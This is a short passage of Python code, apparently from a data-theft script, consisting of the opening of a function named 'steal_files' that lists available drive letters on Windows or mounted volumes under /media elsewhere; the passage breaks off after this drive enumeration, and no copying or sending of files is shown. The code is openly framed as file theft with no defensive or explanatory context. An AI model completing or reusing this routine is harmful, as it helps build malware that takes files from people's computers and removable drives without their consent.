    def steal_files():
        if platform.system() == 'Windows':
            drives = [f'{chr(x)}:' for x in range(67, 91) if os.path.exists(f'{chr(x)}:')]
        else:
            drives = [d for d in os.listdir('/media') if os.path.isdir(os.path.join('/media', d))]
        
